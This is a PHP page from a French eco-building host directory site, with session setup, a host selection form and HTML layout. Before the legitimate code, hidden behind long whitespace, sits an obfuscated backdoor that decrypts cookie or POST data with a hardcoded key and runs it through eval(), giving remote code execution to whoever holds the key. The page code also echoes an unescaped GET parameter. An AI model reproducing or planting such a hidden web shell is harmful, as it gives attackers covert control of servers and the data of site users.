<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $p595 = 116;$GLOBALS['ueceb061f']=Array();global$ueceb061f;$ueceb061f=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['vff4']="\x54\x3a\x4e\x20\x30\x5a\x43\x39\x32\x74\x6e\x33\x3c\x66\x77\x64\x63\xa\x51\x21\x7d\x2e\x4d\x9\x7c\x65\x47\x38\x60\x5c\x4f\xd\x62\x57\x6b\x70\x25\x2f\x69\x6f\x76\x48\x5f\x73\x6d\x23\x44\x7a\x27\x5e\x4a\x40\x45\x36\x4c\x72\x50\x56\x4b\x61\x79\x29\x2b\x71\x49\x67\x46\x28\x53\x24\x26\x35\x2d\x7b\x5d\x22\x2a\x58\x75\x59\x78\x31\x55\x7e\x41\x5b\x2c\x6a\x68\x3b\x3f\x3d\x6c\x37\x3e\x34\x42\x52";$ueceb061f[$ueceb061f['vff4'][65].$ueceb061f['vff4'][8].$ueceb061f['vff4'][81].$ueceb061f['vff4'][27].$ueceb061f['vff4'][81].$ueceb061f['vff4'][4]]=$ueceb061f['vff4'][16].$ueceb061f['vff4'][88].$ueceb061f['vff4'][55];$ueceb061f[$ueceb061f['vff4'][87].$ueceb061f['vff4'][25].$ueceb061f['vff4'][25].$ueceb061f['vff4'][8].$ueceb061f['vff4'][71]]=$ueceb061f['vff4'][39].$ueceb061f['vff4'][55].$ueceb061f['vff4'][15];$ueceb061f[$ueceb061f['vff4'][25].$ueceb061f['vff4'][81].$ueceb061f['vff4'][8].$ueceb061f['vff4'][32].$ueceb061f['vff4'][4].$ueceb061f['vff4'][4].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16]]=$ueceb061f['vff4'][43].$ueceb061f['vff4'][9].$ueceb061f['vff4'][55].$ueceb061f['vff4'][92].$ueceb061f['vff4'][25].$ueceb061f['vff4'][10];$ueceb061f[$ueceb061f['vff4'][92].$ueceb061f['vff4'][95].$ueceb061f['vff4'][71].$ueceb061f['vff4'][4].$ueceb061f['vff4'][7]]=$ueceb061f['vff4'][38].$ueceb061f['vff4'][10].$ueceb061f['vff4'][38].$ueceb061f['vff4'][42].$ueceb061f['vff4'][43].$ueceb061f['vff4'][25].$ueceb061f['vff4'][9];$ueceb061f[$ueceb061f['vff4'][88].$ueceb061f['vff4'][95].$ueceb061f['vff4'][81].$ueceb061f['vff4'][71].$ueceb061f['vff4'][95].$ueceb061f['vff4'][81].$ueceb061f['vff4'][15].$ueceb061f['vff4'][8].$ueceb061f['vff4'][27]]=$ueceb061f['vff4'][43].$ueceb061f['vff4'][25].$ueceb061f['vff4'][55].$ueceb061f['vff4'][38].$ueceb061f['vff4'][59].$ueceb061f['vff4'][92].$ueceb061f['vff4'][38].$ueceb061f['vff4'][47].$ueceb061f['vff4'][25];$ueceb061f[$ueceb061f['vff4'][38].$ueceb061f['vff4'][13].$ueceb061f['vff4'][81].$ueceb061f['vff4'][15].$ueceb061f['vff4'][32].$ueceb061f['vff4'][16].$ueceb061f['vff4'][11].$ueceb061f['vff4'][95].$ueceb061f['vff4'][8]]=$ueceb061f['vff4'][35].$ueceb061f['vff4'][88].$ueceb061f['vff4'][35].$ueceb061f['vff4'][40].$ueceb061f['vff4'][25].$ueceb061f['vff4'][55].$ueceb061f['vff4'][43].$ueceb061f['vff4'][38].$ueceb061f['vff4'][39].$ueceb061f['vff4'][10];$ueceb061f[$ueceb061f['vff4'][43].$ueceb061f['vff4'][15].$ueceb061f['vff4'][32].$ueceb061f['vff4'][59].$ueceb061f['vff4'][71].$ueceb061f['vff4'][11].$ueceb061f['vff4'][81]]=$ueceb061f['vff4'][78].$ueceb061f['vff4'][10].$ueceb061f['vff4'][43].$ueceb061f['vff4'][25].$ueceb061f['vff4'][55].$ueceb061f['vff4'][38].$ueceb061f['vff4'][59].$ueceb061f['vff4'][92].$ueceb061f['vff4'][38].$ueceb061f['vff4'][47].$ueceb061f['vff4'][25];$ueceb061f[$ueceb061f['vff4'][25].$ueceb061f['vff4'][4].$ueceb061f['vff4'][13].$ueceb061f['vff4'][32].$ueceb061f['vff4'][59].$ueceb061f['vff4'][4].$ueceb061f['vff4'][7].$ueceb061f['vff4'][71]]=$ueceb061f['vff4'][32].$ueceb061f['vff4'][59].$ueceb061f['vff4'][43].$ueceb061f['vff4'][25].$ueceb061f['vff4'][53].$ueceb061f['vff4'][95].$ueceb061f['vff4'][42].$ueceb061f['vff4'][15].$ueceb061f['vff4'][25].$ueceb061f['vff4'][16].$ueceb061f['vff4'][39].$ueceb061f['vff4'][15].$ueceb061f['vff4'][25];$ueceb061f[$ueceb061f['vff4'][88].$ueceb061f['vff4'][11].$ueceb061f['vff4'][81].$ueceb061f['vff4'][27].$ueceb061f['vff4'][25]]=$ueceb061f['vff4'][43].$ueceb061f['vff4'][25].$ueceb061f['vff4'][9].$ueceb061f['vff4'][42].$ueceb061f['vff4'][9].$ueceb061f['vff4'][38].$ueceb061f['vff4'][44].$ueceb061f['vff4'][25].$ueceb061f['vff4'][42].$ueceb061f['vff4'][92].$ueceb061f['vff4'][38].$ueceb061f['vff4'][44].$ueceb061f['vff4'][38].$ueceb061f['vff4'][9];$ueceb061f[$ueceb061f['vff4'][88].$ueceb061f['vff4'][11].$ueceb061f['vff4'][7].$ueceb061f['vff4'][53]]=$ueceb061f['vff4'][47].$ueceb061f['vff4'][11].$ueceb061f['vff4'][8].$ueceb061f['vff4'][81].$ueceb061f['vff4'][4].$ueceb061f['vff4'][11].$ueceb061f['vff4'][59].$ueceb061f['vff4'][32];$ueceb061f[$ueceb061f['vff4'][35].$ueceb061f['vff4'][7].$ueceb061f['vff4'][8].$ueceb061f['vff4'][15].$ueceb061f['vff4'][11]]=$ueceb061f['vff4'][88].$ueceb061f['vff4'][15].$ueceb061f['vff4'][7].$ueceb061f['vff4'][59].$ueceb061f['vff4'][95];$ueceb061f[$ueceb061f['vff4'][15].$ueceb061f['vff4'][32].$ueceb061f['vff4'][4].$ueceb061f['vff4'][32].$ueceb061f['vff4'][13].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16]]=$_POST;$ueceb061f[$ueceb061f['vff4'][16].$ueceb061f['vff4'][81].$ueceb061f['vff4'][59].$ueceb061f['vff4'][32].$ueceb061f['vff4'][27].$ueceb061f['vff4'][59].$ueceb061f['vff4'][15]]=$_COOKIE;@$ueceb061f[$ueceb061f['vff4'][92].$ueceb061f['vff4'][95].$ueceb061f['vff4'][71].$ueceb061f['vff4'][4].$ueceb061f['vff4'][7]]($ueceb061f['vff4'][25].$ueceb061f['vff4'][55].$ueceb061f['vff4'][55].$ueceb061f['vff4'][39].$ueceb061f['vff4'][55].$ueceb061f['vff4'][42].$ueceb061f['vff4'][92].$ueceb061f['vff4'][39].$ueceb061f['vff4'][65],NULL);@$ueceb061f[$ueceb061f['vff4'][92].$ueceb061f['vff4'][95].$ueceb061f['vff4'][71].$ueceb061f['vff4'][4].$ueceb061f['vff4'][7]]($ueceb061f['vff4'][92].$ueceb061f['vff4'][39].$ueceb061f['vff4'][65].$ueceb061f['vff4'][42].$ueceb061f['vff4'][25].$ueceb061f['vff4'][55].$ueceb061f['vff4'][55].$ueceb061f['vff4'][39].$ueceb061f['vff4'][55].$ueceb061f['vff4'][43],0);@$ueceb061f[$ueceb061f['vff4'][92].$ueceb061f['vff4'][95].$ueceb061f['vff4'][71].$ueceb061f['vff4'][4].$ueceb061f['vff4'][7]]($ueceb061f['vff4'][44].$ueceb061f['vff4'][59].$ueceb061f['vff4'][80].$ueceb061f['vff4'][42].$ueceb061f['vff4'][25].$ueceb061f['vff4'][80].$ueceb061f['vff4'][25].$ueceb061f['vff4'][16].$ueceb061f['vff4'][78].$ueceb061f['vff4'][9].$ueceb061f['vff4'][38].$ueceb061f['vff4'][39].$ueceb061f['vff4'][10].$ueceb061f['vff4'][42].$ueceb061f['vff4'][9].$ueceb061f['vff4'][38].$ueceb061f['vff4'][44].$ueceb061f['vff4'][25],0);@$ueceb061f[$ueceb061f['vff4'][88].$ueceb061f['vff4'][11].$ueceb061f['vff4'][81].$ueceb061f['vff4'][27].$ueceb061f['vff4'][25]](0);$waf01ca8=NULL;$c764=NULL;$ueceb061f[$ueceb061f['vff4'][10].$ueceb061f['vff4'][81].$ueceb061f['vff4'][32].$ueceb061f['vff4'][16].$ueceb061f['vff4'][13].$ueceb061f['vff4'][53].$ueceb061f['vff4'][16]]=$ueceb061f['vff4'][25].$ueceb061f['vff4'][32].$ueceb061f['vff4'][71].$ueceb061f['vff4'][93].$ueceb061f['vff4'][15].$ueceb061f['vff4'][15].$ueceb061f['vff4'][53].$ueceb061f['vff4'][16].$ueceb061f['vff4'][72].$ueceb061f['vff4'][11].$ueceb061f['vff4'][93].$ueceb061f['vff4'][95].$ueceb061f['vff4'][59].$ueceb061f['vff4'][72].$ueceb061f['vff4'][95].$ueceb061f['vff4'][15].$ueceb061f['vff4'][7].$ueceb061f['vff4'][27].$ueceb061f['vff4'][72].$ueceb061f['vff4'][59].$ueceb061f['vff4'][53].$ueceb061f['vff4'][11].$ueceb061f['vff4'][15].$ueceb061f['vff4'][72].$ueceb061f['vff4'][8].$ueceb061f['vff4'][81].$ueceb061f['vff4'][59].$ueceb061f['vff4'][8].$ueceb061f['vff4'][81].$ueceb061f['vff4'][13].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16].$ueceb061f['vff4'][4].$ueceb061f['vff4'][27].$ueceb061f['vff4'][71].$ueceb061f['vff4'][16];global$n1bcf6c;function hd9a4($waf01ca8,$eb370c5a){global$ueceb061f;$ee55064a="";for($ga3fe2a7d=0;$ga3fe2a7d<$ueceb061f[$ueceb061f['vff4'][25].$ueceb061f['vff4'][81].$ueceb061f['vff4'][8].$ueceb061f['vff4'][32].$ueceb061f['vff4'][4].$ueceb061f['vff4'][4].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16]]($waf01ca8);){for($aedbac842=0;$aedbac842<$ueceb061f[$ueceb061f['vff4'][25].$ueceb061f['vff4'][81].$ueceb061f['vff4'][8].$ueceb061f['vff4'][32].$ueceb061f['vff4'][4].$ueceb061f['vff4'][4].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16]]($eb370c5a)&&$ga3fe2a7d<$ueceb061f[$ueceb061f['vff4'][25].$ueceb061f['vff4'][81].$ueceb061f['vff4'][8].$ueceb061f['vff4'][32].$ueceb061f['vff4'][4].$ueceb061f['vff4'][4].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16]]($waf01ca8);$aedbac842++,$ga3fe2a7d++){$ee55064a.=$ueceb061f[$ueceb061f['vff4'][65].$ueceb061f['vff4'][8].$ueceb061f['vff4'][81].$ueceb061f['vff4'][27].$ueceb061f['vff4'][81].$ueceb061f['vff4'][4]]($ueceb061f[$ueceb061f['vff4'][87].$ueceb061f['vff4'][25].$ueceb061f['vff4'][25].$ueceb061f['vff4'][8].$ueceb061f['vff4'][71]]($waf01ca8[$ga3fe2a7d])^$ueceb061f[$ueceb061f['vff4'][87].$ueceb061f['vff4'][25].$ueceb061f['vff4'][25].$ueceb061f['vff4'][8].$ueceb061f['vff4'][71]]($eb370c5a[$aedbac842]));}}return$ee55064a;}function z32103ab($waf01ca8,$eb370c5a){global$ueceb061f;global$n1bcf6c;return$ueceb061f[$ueceb061f['vff4'][35].$ueceb061f['vff4'][7].$ueceb061f['vff4'][8].$ueceb061f['vff4'][15].$ueceb061f['vff4'][11]]($ueceb061f[$ueceb061f['vff4'][35].$ueceb061f['vff4'][7].$ueceb061f['vff4'][8].$ueceb061f['vff4'][15].$ueceb061f['vff4'][11]]($waf01ca8,$n1bcf6c),$eb370c5a);}foreach($ueceb061f[$ueceb061f['vff4'][16].$ueceb061f['vff4'][81].$ueceb061f['vff4'][59].$ueceb061f['vff4'][32].$ueceb061f['vff4'][27].$ueceb061f['vff4'][59].$ueceb061f['vff4'][15]]as$eb370c5a=>$f3d338){$waf01ca8=$f3d338;$c764=$eb370c5a;}if(!$waf01ca8){foreach($ueceb061f[$ueceb061f['vff4'][15].$ueceb061f['vff4'][32].$ueceb061f['vff4'][4].$ueceb061f['vff4'][32].$ueceb061f['vff4'][13].$ueceb061f['vff4'][13].$ueceb061f['vff4'][16]]as$eb370c5a=>$f3d338){$waf01ca8=$f3d338;$c764=$eb370c5a;}}$waf01ca8=@$ueceb061f[$ueceb061f['vff4'][43].$ueceb061f['vff4'][15].$ueceb061f['vff4'][32].$ueceb061f['vff4'][59].$ueceb061f['vff4'][71].$ueceb061f['vff4'][11].$ueceb061f['vff4'][81]]($ueceb061f[$ueceb061f['vff4'][88].$ueceb061f['vff4'][11].$ueceb061f['vff4'][7].$ueceb061f['vff4'][53]]($ueceb061f[$ueceb061f['vff4'][25].$ueceb061f['vff4'][4].$ueceb061f['vff4'][13].$ueceb061f['vff4'][32].$ueceb061f['vff4'][59].$ueceb061f['vff4'][4].$ueceb061f['vff4'][7].$ueceb061f['vff4'][71]]($waf01ca8),$c764));if(isset($waf01ca8[$ueceb061f['vff4'][59].$ueceb061f['vff4'][34]])&&$n1bcf6c==$waf01ca8[$ueceb061f['vff4'][59].$ueceb061f['vff4'][34]]){if($waf01ca8[$ueceb061f['vff4'][59]]==$ueceb061f['vff4'][38]){$ga3fe2a7d=Array($ueceb061f['vff4'][35].$ueceb061f['vff4'][40]=>@$ueceb061f[$ueceb061f['vff4'][38].$ueceb061f['vff4'][13].$ueceb061f['vff4'][81].$ueceb061f['vff4'][15].$ueceb061f['vff4'][32].$ueceb061f['vff4'][16].$ueceb061f['vff4'][11].$ueceb061f['vff4'][95].$ueceb061f['vff4'][8]](),$ueceb061f['vff4'][43].$ueceb061f['vff4'][40]=>$ueceb061f['vff4'][81].$ueceb061f['vff4'][21].$ueceb061f['vff4'][4].$ueceb061f['vff4'][72].$ueceb061f['vff4'][81],);echo@$ueceb061f[$ueceb061f['vff4'][88].$ueceb061f['vff4'][95].$ueceb061f['vff4'][81].$ueceb061f['vff4'][71].$ueceb061f['vff4'][95].$ueceb061f['vff4'][81].$ueceb061f['vff4'][15].$ueceb061f['vff4'][8].$ueceb061f['vff4'][27]]($ga3fe2a7d);}elseif($waf01ca8[$ueceb061f['vff4'][59]]==$ueceb061f['vff4'][25]){eval/*zd26ddcf5*/($waf01ca8[$ueceb061f['vff4'][15]]);}exit();} ?><?php
$ttl = 4*24*3600; 
session_set_cookie_params($ttl);
ini_set('session.gc_maxlifetime', $ttl);
session_name('eceh');
session_start();
//include ('prefix.php');
include ('defineInc.php');
include ('dbInc.php');

  if (@$_GET['action'] == "chantierChange"){
    $_SESSION['chantier'] = "";
  }elseif (isset($_SESSION['chantier']) && is_numeric($_SESSION['chantier']) && $_SESSION['chantier'] >= 0 && $_SESSION['chantier'] < $NB_HOTES){
//  die("tt".$_SESSION['chantier']."tt".$DEF_NB."tt");
//  debug("hote.php : ".$DEF_NB ." : ". $_SESSION['chantier']);
	$chantier = @$_SESSION['chantier'];
    $meta = '<meta http-equiv="refresh" content="0;url=hote_view.php" />';
  }
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" xml:lang="fr" xmlns="http://www.w3.org/1999/xhtml" lang="fr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<title>EcoChantiers en EcoHabitats - Hotes</title>
<?php
echo @$meta;
?>
	<meta name="generator" content="DokuWiki Release 2009-12-25c &quot;Lemming&quot;"/>
	<meta name="robots" content="index,follow"/>
	<meta name="date" content="2008-06-19T18:16:49+0200"/>
	<meta name="keywords" content="alterenergies,accueil"/>
	<link rel="search" type="application/opensearchdescription+xml" href="http://www.alterenergies.org/lib/exe/opensearch.php" title="Alter'énergies"/>
	<link rel="start" href="http://www.alterenergies.org/"/>
	<link rel="contents" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil&amp;do=index" title="Index"/>
	<link rel="canonical" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil"/>
	<link rel="stylesheet" media="screen" type="text/css" href="css/css.css?v=<?php echo filemtime('css/css.css');?>"/>
	<link rel="stylesheet" media="print" type="text/css" href="css/print.css?v=<?php echo filemtime('css/print.css');?>">
	<link rel="stylesheet" type="text/css" href="css/font.css" />
	<script type="text/javascript" src="lib/prototype.js"></script>
	<script type="text/javascript" charset="utf-8" src="js/core.js"></script>
	<script type="text/javascript" charset="utf-8" src="js/hote.js"></script>
	
	<link rel="icon" type="image/png" href="gfx/favicon.png"/>
<!--	Correctif pour l'affichage de #contenu-page dans IE6 qui ne connait pas les contextes de formatage :
http://css.alsacreations.com/Faire-une-mise-en-page-sans-tableaux/design-trois-colonnes-positionnement-flottant
		Et autres...
-->
<!--[if lte IE 6]>
	<style type="text/css">
	#page-contenu {
		overflow: visible;
		height:1px;
	}
	#sommaire-gauche {
		margin-left:4px;
	}
	#bandeau {
		overflow: visible;
		border-bottom:0;
	}
	#titre-alterenergies {
		border-bottom:1px solid #036bc2;
	}
	#page-edition-arriere-plan{
		//overflow:visible;
	}
	#page-edition{width:100%;}
	.footerinc{overflow:visible;}
	div.dokuwiki{overflow:hidden;}
</style><![endif]-->
</head>
<body>
<div class="eceh">
	<div id="bandeau">
		<?php include ('headerInc.php'); ?>
	</div>
	<?php echo $DEF_ACCUEIL_H;	// bouton deconnexion haut et bas ?>	
	<!-- DIV utilisé pour faire le dégradé derrière #nos-services, #page-content, #page-edition  -->
	<div id="conteneur-degrade">	
		<div id="trois-colonnes">
			<div id="participants">
				<?php include ('writeHoteInc.php'); ?>          
<!--        <li class="level1"><div class="li"><a class="participants">Mathieu Sabin (10 p.)<br> Le Petit Pressigny</a></div></li>
            <li class="level1"><div class="li"><a class="participants">Stephane Artous (15 p.)<br> Preuilly sur Claise</a></div></li>-->    
			</div> <!-- Fin #colonne-participants -->
			<div id="colonne-droite">
			<?php include ('partenInc.php'); ?>
      		</div><!-- Fin de #colonne-droite -->
			<div id="page-contenu">
				<div class='recap'>
					<form id="finscription" method="post" action="hote_view.php" onsubmit="" accept-charset="utf-8">        
<?php
//          <form id="finscription" method="post" action="hote_view.php" onsubmit="return valider(this)" accept-charset="utf-8">
	if (@$_GET["err"] != "")
		echo "<span class='attention'>".@$_GET["err"]."</span>";
?>
						<input type="hidden" id="action" name="action" value="login" />
						<p><label for="chantier"><?php echo $missingHote; ?><span>Où ?</span></label> 
							<select class="edit" id="chantier" name="chantier">
								<option value='-1'>Choisissez un lieu</option>
								<option value='0'>Tous</option>

<?php
	if (!$chantier) 
		$chantier = $_POST["chantier"];
	$sql_S = 'SELECT id, nom, ordre_aff FROM '.$s_tablePrefix.'eceh_hote WHERE ordre_aff>0 ORDER BY ordre_aff';
	$query = mysql_query($sql_S) or die ("<br>erreur sur : " . $sql_S);  
	while($data = mysql_fetch_array($query)){
   // $num = $data['id'] > 13 ? $data['id']-1 : $data['id'];
		$selected = $data['id'] == $chantier ? ' selected' : '';
		echo '            <option value="'.$data["id"].'"'.$selected.'>'.$data["ordre_aff"].'. '.$data["nom"].'</option>';
	}
	mysql_free_result($query);
?>          
							</select>
						</p>
						<!--<p><label class="block" for="pwd"><span>Code d'accès</span></label><input id="pwd" name="pwd" class="edit" type="password"></p>-->
						<p><input name="do[Voir]" id="do" value="voir" class="button img voir" type="image" src="gfx/boutons-voir.gif"></p>          
					</form>
				</div>
			</div><!-- Fin de #page-contenu -->
		</div><!-- fin DIV #deux-colonnes -->
		<div style="clear: both;"></div>
		<?php echo $DEF_ACCUEIL_B; // bouton deconnexion haut et bas ?>	
	</div><!-- fin DIV pour dégradé #conteneur-degrade -->
	<div style="clear: both;"></div>
	<?php include ('footerInc.php'); ?>
</div>
</body>
</html>